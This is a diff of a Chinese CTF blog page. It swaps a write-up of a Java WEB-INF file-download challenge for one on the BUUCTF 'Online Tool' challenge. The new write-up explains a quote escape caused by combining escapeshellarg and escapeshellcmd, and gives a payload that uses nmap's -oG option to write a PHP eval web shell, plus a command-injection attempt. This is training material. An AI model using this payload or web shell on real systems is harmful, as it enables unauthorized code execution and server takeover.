@@ -9,7 +9,7 @@
     
     <title>
         
-            EasyJava |
+            OnlineTool |
         
         paixiaoxing&#39;s Blog
     </title>
@@ -137,7 +137,7 @@
     <div class="article-content-container">
 
         <div class="article-title">
-            <span class="title-hover-animation">EasyJava</span>
+            <span class="title-hover-animation">OnlineTool</span>
         </div>
 
         
@@ -156,8 +156,8 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fas fa-edit"></i>&nbsp;
-        <span class="pc">2022-02-01 17:04:40</span>
-        <span class="mobile">2022-02-01 17:04</span>
+        <span class="pc">2022-02-03 10:59:38</span>
+        <span class="mobile">2022-02-03 10:59</span>
     </span>
     
     
@@ -174,41 +174,42 @@
         
 
         <div class="article-content markdown-body">
-            <h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>java类的题目没写过，还是先进去看看把</p>
-<p><img src="/2022/02/01/EasyJava/3.png" alt="1"></p>
-<p>不知道是啥漏洞，提示了是java应该不是sql注入</p>
-<p>尝试爆破的时候发现爆出了账号密码</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">admin888</span><br></pre></td></tr></table></figure>
+            <h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">此题涉及到的知识点：</span><br><span class="line">nmap的使用、RCE、escapeshellarg和escapeshellcmd的组合引发的引号逃逸代码执行</span><br></pre></td></tr></table></figure>
 
-<p>登录进去看看</p>
-<p><img src="/2022/02/01/EasyJava/1.png" alt="1"></p>
-<p>可惜，flag不在这里，而且是送分题</p>
-<p>去看看别的</p>
-<p>主页下面有个help点进去看看</p>
-<p><img src="/2022/02/01/EasyJava/2.png" alt="1"></p>
-<p>好像有任意文件读取漏洞，但是读不到</p>
-<p>试试直接进入，下载了一个文件</p>
-<p>可是里面也没有什么信息，是个假的</p>
-<p>这里我就不会做了因为java也没做过就去看了看大佬的wp</p>
-<p>没想到请求方式也是假的用post可以直接下载</p>
-<p>但是之前我已经下载过了</p>
-<p>这之后涉及到一个java-web开发的一个点，因为没接触过所以这里偷抄记录一下大佬写的（<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/wy_97/article/details/78165051%EF%BC%89">https://blog.csdn.net/wy_97/article/details/78165051）<i class="fas fa-external-link-alt"></i></a></p>
-<p>说是WEB-INF是javaweb应用的安全目录，如果想要访问其中的文件，必须通过web.xml</p>
-<p>相互映射才能访问</p>
-<p>简单来说就是</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> WEB-INF主要包含一下文件或目录：</span><br><span class="line">    /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">    /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">    /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">    /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">    /WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = md5(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>我们可以post传入web.xml读取一下</p>
-<p><img src="/2022/02/01/EasyJava/4.png" alt="1"></p>
-<p>找到flag了，发现在com/wm/ctf/FlagController里面有个flag</p>
-<p>读取一下class文件</p>
-<p>路径就是/classes/com/wm/ctf/FlagController.class</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure>
+<p>题目一开始给到了思路RCE跟PHP</p>
+<p>有个host那就试试直接命令执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=127.0.0.1;ls</span><br></pre></td></tr></table></figure>
 
-<p>POST下载文件</p>
-<p><img src="/2022/02/01/EasyJava/5.png" alt="1"></p>
-<p>将其中的base64编码解码就能得到了</p>
-<p><img src="/2022/02/01/EasyJava/6.png" alt="1"></p>
+<p><img src="/2022/02/03/OnlineTool/2.png" alt="1"></p>
+<p>没用，看看题目再看看代码，可能是跟nmap工具有关</p>
+<p>查了一下他的使用方法</p>
+<p>oG可以再文件里写入程序</p>
+<p><img src="/2022/02/03/OnlineTool/3.png" alt="1"></p>
+<p>那我们是否可以让他扫描我们的一句话木马存入我们指定的php文件中呢？</p>
+<p>试一下</p>
+<p><img src="/2022/02/03/OnlineTool/4.png" alt="1"></p>
+<p>发现可以上传</p>
+<p>也给了文件地址</p>
+<p>但是怎么也连不上</p>
+<p>而且还有两个函数也不太清楚</p>
+<p>实在不会，找了大佬的wp看了一下</p>
+<p>发现</p>
+<h3 id="escapeshellarg和escapeshellcmd使用不当会造成引号逃逸"><a href="#escapeshellarg和escapeshellcmd使用不当会造成引号逃逸" class="headerlink" title="escapeshellarg和escapeshellcmd使用不当会造成引号逃逸"></a>escapeshellarg和escapeshellcmd使用不当会造成引号逃逸</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">传入的参数是：172.17.0.2&#x27; -v -d a=1</span><br><span class="line">经过escapeshellarg处理后变成了&#x27;172.17.0.2&#x27;\&#x27;&#x27; -v -d a=1&#x27;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</span><br><span class="line">经过escapeshellcmd处理后变成&#x27;172.17.0.2&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php</span><br><span class="line">最后执行的命令是curl &#x27;172.17.0.2&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;，由于中间的\\被解释为\而不再是转义字符，所以后面的&#x27;没有被转义，与再后面的&#x27;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1&#x27;，即向172.17.0.2\发起请求，POST 数据为a=1&#x27;。</span><br><span class="line">原文链接：https://blog.csdn.net/qq_26406447/article/details/100711933</span><br></pre></td></tr></table></figure>
+
+<p>简单来说就是两次转义之后出现问题了，导致单引号逃逸</p>
+<p>源代码里echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host);</p>
+<p>可以有传入参数，经过两层过滤常见的命令注入操作都不行</p>
+<p>因为escapeshellcmd会对前面的特殊符号进行转义，但是我们有nmap可以有哦那个nmap来执行就是上面的oG</p>
+<p>就可以想到上传一句话木马了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=&#x27; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#x27;</span><br></pre></td></tr></table></figure>
+
+<p>返回了文件夹名字</p>
+<p>我们直接蚁剑链接就行了</p>
+<p><img src="/2022/02/03/OnlineTool/6.png" alt="1"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">注意：?host=&#x27; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#x27;</span><br><span class="line">单引号前面一定要加空格跟引号</span><br><span class="line">如果没有加引号，生成的文件名后面会多一个引号</span><br><span class="line">如果加了引号不加空格</span><br><span class="line">那么文件名后面会多\\</span><br><span class="line">只有让生成的所有引号全部跟我们的引号结合之后全部闭合才能够执行</span><br></pre></td></tr></table></figure>
+
 
         </div>
 
@@ -219,29 +220,14 @@
         
             <div class="article-nav">
                 
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2022/02/03/OnlineTool/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">OnlineTool</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
                 
                     <div class="article-next">
                         <a class="next"
                            rel="next"
-                           href="/2022/02/01/BabyUpload/"
+                           href="/2022/02/01/EasyJava/"
                         >
                             <span class="title flex-center">
-                                <span class="post-nav-title-item">BabyUpload</span>
+                                <span class="post-nav-title-item">EasyJava</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex-center">
